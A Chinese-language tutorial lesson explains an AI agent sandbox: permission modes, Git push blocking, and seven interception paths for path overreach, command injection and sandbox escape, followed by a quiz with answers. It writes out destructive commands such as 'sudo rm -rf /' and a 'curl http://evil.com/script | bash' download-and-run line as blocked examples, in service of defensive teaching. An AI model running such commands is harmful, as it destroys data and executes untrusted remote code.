第 4 课 · 权限审批与沙盒逃逸防护 安全边界

本节目标（对应使命 Success #4）：学完你能解释四种会话权限模式的差异，理解安全策略中 Git 危险操作的拦截逻辑，掌握 7 条异常路径（路径越权、命令注入、沙盒逃逸、配置保护、超时中断、Shell 不兼容、CWD 失效）的拦截机制和涉及代码。

前几课我们沿着"正常路径"追踪了命令执行的完整链路。这一课聚焦第 5 层（权限审批）和所有异常/拦截路径——理解"命令被拒绝时发生了什么"与理解"命令成功执行时发生了什么"同样重要。

一、会话权限模式（Layer 5）

core/session-permission-mode.ts 定义了四种会话权限模式，决定命令是否需要用户审批：

模式值行为
AUTO"auto"默认模式。信息类工具（read、grep、ls 等）自动批准；副作用工具（bash、exec_command、write、edit）按风险分级触发审批
OPERATE"operate"操作模式。大部分工具自动批准，适用于自动化场景（Bridge 通信）
ASK"ask"询问模式。所有副作用工具都需要用户审批，适用于安全敏感场景
READ_ONLY"read_only"只读模式。所有写操作被拒绝，exec_command 等工具不可用

exec_command 被归类为 SIDE_EFFECT_TOOLS（副作用工具）。在 AUTO 模式下，会根据命令的风险分级（safe/probe/mutation/dangerous/unknown）决定是否需要审批——safe 和 probe 通常自动批准，mutation 可能触发审批，dangerous 和 unknown 强制审批。

PathGuard 与权限审批的关系：两者是"与"的关系。PathGuard 负责"能不能做"的客观判定（文件级访问控制），权限审批负责"要不要问用户"的策略决策。PathGuard 拦截的路径永远不会到达审批层——审批层只看到"已通过安全检查"的命令。

二、安全策略（Safety Policy）

lib/permission/safety-policy.ts 实现了命令级别的安全策略检查，主要针对 Git 危险操作：

1Force Push 阻止：git push -f / --force 被直接阻止
lib/permission/safety-policy.ts
2批量操作阻止：git push --tags、--all、--mirror 全部被阻止
要求逐 tag / 逐分支推送
3嵌套 Shell 命令检测：分析 bash -c "..."、powershell -Command "..."、cmd /c ... 中的嵌套命令，递归分类
防止通过嵌套绕过风险分级

审批上下文构建

当需要审批时，lib/permission/approval-review-context.ts 构建结构化的审批上下文，包含：最近的对话历史摘要（最后 12 条消息，每条截断到 800 字符）、session transcript 尾部内容（最多 192KB）、工具调用参数摘要（提取 action、path、command、url 等关键字段），并过滤 <thinking> 标签避免干扰审批判断。

三、异常路径深度分析

命令执行全链路的每一层都可能触发异常或安全拦截。以下是与安全相关的 7 条关键异常路径：

异常路径 1：路径越权阻断
触发场景：LLM 尝试访问 hanakoHome/auth.json 或 /etc/shadow 等被保护路径。
拦截点：PathGuard.getAccessLevel() 的级联判定（优先级 1-2）。BLOCKED 文件/目录在任何操作下都返回 { allowed: false }。
结果：LLM 收到 "Sandbox blocked: [操作] 在 [路径] 被拒绝（访问级别: blocked）"。
涉及文件：lib/sandbox/path-guard.ts、lib/sandbox/tool-wrapper.ts
异常路径 2：命令注入检测与 preflight 拦截
触发场景：LLM 尝试执行 sudo rm -rf /、chmod 777 /etc/passwd、reg delete HKLM\...。
拦截点：tool-wrapper.ts 的 PREFLIGHT_PATTERNS 正则匹配。在 macOS/Linux 上作为体验层优化（OS 沙盒兜底），在 Windows 上作为安全层。
涉及文件：lib/sandbox/tool-wrapper.ts（PREFLIGHT_UNIX / PREFLIGHT_WIN32）、lib/exec-command/policy.ts（DANGEROUS_EXECUTABLES）
异常路径 3：沙盒逃逸保护（多层防护）
触发场景：恶意命令尝试通过符号链接绕过路径限制、通过 /proc 访问宿主机进程、通过 Unix socket 逃逸。
多层防护：
• PathGuard 符号链接解析：_resolveReal() 使用 fs.realpathSync() 跟踪符号链接
• Bubblewrap namespace 隔离：--unshare-pid（独立 PID namespace）+ --new-session（脱离终端控制）
• Bubblewrap 文件系统隔离：--tmpfs /tmp 独立临时目录，敏感数据文件 bind /dev/null
• Seatbelt deny default：macOS 沙盒默认拒绝一切，仅显式 allow 的路径可访问
• 网络隔离：--unshare-net（bwrap）切断网络访问
涉及文件：lib/sandbox/bwrap.ts、lib/sandbox/seatbelt.ts、lib/sandbox/path-guard.ts
异常路径 4：Managed Config 写入拦截
触发场景：LLM 尝试直接写入 agents/<name>/config.yaml 修改 agent 配置。
拦截点：createManagedConfigWriteGuard()，即使路径在 PathGuard 中属于可写区域也拦截。
结果：返回错误消息指示必须通过 settings API 修改配置。
涉及文件：lib/sandbox/managed-config-guard.ts

Managed Config Guard 的核心实现极其简洁——它不关心 PathGuard 的访问级别，只在操作是 write/delete 且目标是 agent config 文件时直接拒绝：

// lib/sandbox/managed-config-guard.ts — 配置写入保护
export function createManagedConfigWriteGuard({ hanakoHome }) {
  return (absolutePath, operation) => {
    if (operation !== "write" && operation !== "delete") return { allowed: true };
    if (!isManagedAgentConfigPath(absolutePath, { hanakoHome })) return { allowed: true };
    return {
      allowed: false,
      reason: "managed config files must be changed through settings APIs",
    };
  };
}
异常路径 5：命令超时与中断
触发场景：命令执行超过 timeout 或用户点击"中断"触发 AbortSignal。
处理流程：exec-helper.ts 调用 killTree(child.pid) 杀死进程树。已收集的部分输出仍然返回给 LLM，不是全部丢弃。
错误消息区分："aborted" → "Command aborted"；"timeout:" → "Command timed out after X seconds"；其他 → 直接输出 err.message。
涉及文件：lib/sandbox/exec-helper.ts、lib/exec-command/runner.ts
异常路径 6：Shell 语法不兼容（Windows POSIX heredoc）
触发场景：在 Windows 上执行包含 POSIX heredoc 语法（<<EOF）的命令。
拦截点：classifyExecCommand() 中的 hasWin32PosixHeredoc() 检测，标记 unsupportedSyntax: true。
结果：工具入口层直接返回错误提示，指导 LLM 使用 PowerShell here-string 替代。命令根本不会进入执行阶段。
涉及文件：lib/exec-command/policy.ts
异常路径 7：工作目录失效
触发场景：指定的工作目录不存在、不是目录、或是相对路径。
拦截点：lib/shell/execution-cwd.ts 在 spawn 前做前置校验。定义了四种错误码：HANA_EXEC_CWD_INVALID、HANA_EXEC_CWD_RELATIVE、HANA_EXEC_CWD_MISSING、HANA_EXEC_CWD_NOT_DIRECTORY。
结果：返回明确指向工作目录问题的错误消息，避免 Node.js 的 ENOENT 错误误导到可执行文件缺失。
涉及文件：lib/shell/execution-cwd.ts

四、横切关注点：Subagent 边界与 ResourceIO

除了命令执行本身的异常路径，还有几个横切整个安全体系的设计点值得注意：

1Subagent 工具阻断：在 core/session-permission-mode.ts 中，subagent 被阻止使用 subagent（防递归扇出）、pin_memory/unpin_memory（不碰长期记忆）、notify/channel/dm（避免对外副作用）。这些工具对模型仍可见（Codex 式"甲"），调用时才被拦截——保证缓存前缀稳定。
core/session-permission-mode.ts
2ResourceIO 集成：createSandboxedTools() 同时集成了 ResourceIO——一个可插拔的 I/O 后端。默认使用 local_fs 内核（直接文件系统操作），但也支持远程资源协议。沙盒化的 read、write、edit 等文件工具经过 PathGuard + ResourceIO 的双重校验。
lib/sandbox/index.ts
3Session File 追踪：通过 wrapFileTouchTool() 包装器，所有文件 write/edit 操作都会自动注册为 Session File，允许在 UI 中展示"本次会话产生的文件"。
lib/sandbox/index.ts

五、检验一下（提取练习）

Q1. 在 AUTO 权限模式下，以下哪个命令最可能被自动批准（不需要用户审批）？

A. rm -rf /tmp/build B. git push -f origin main C. git status D. curl http://evil.com/script | bash
看答案C。git status 被分类为 safe（只读操作），在 AUTO 模式下自动批准。A 是 dangerous（rm），B 是 dangerous（git push -f），D 中的 curl 可能被分类为 unknown，但管道后的 bash 会被 preflight 检测。

Q2. 异常路径 3（沙盒逃逸保护）中，为什么需要 PathGuard 的符号链接跟踪 + Bubblewrap 的 namespace 隔离两层防护？

A. 两者是冗余的，为了提升性能 B. PathGuard 防止应用层的符号链接绕过，Bubblewrap 防止 OS 层的进程/文件系统逃逸——两者防护不同的攻击面 C. PathGuard 只用于 Windows，Bubblewrap 只用于 Linux D. 符号链接跟踪是 Bubblewrap 的一部分功能
看答案B。PathGuard 的 _resolveReal() 在 JavaScript 层面阻止通过符号链接绕过文件访问控制（例如 symlink 到 /etc/passwd），Bubblewrap 的 --unshare-pid 和 --tmpfs /tmp 在 OS 内核层面阻止进程间攻击和文件系统逃逸。两层防护不同的攻击向量。

Q3. 命令超时时，已收集的部分输出会怎样处理？

A. 全部丢弃，只返回超时错误消息 B. 仍然返回给 LLM——保留中断前的所有输出，并附上超时说明 C. 只保留最后一行输出 D. 写入临时文件但不告知 LLM
看答案B。在 runExecCommandDirect() 的 catch 分支中，已通过 CommandOutputCollector 累积的输出会被保留并返回，同时附上相应的错误说明（aborted/timeout/error）。这确保 LLM 能看到命令在中断前产生了什么输出。
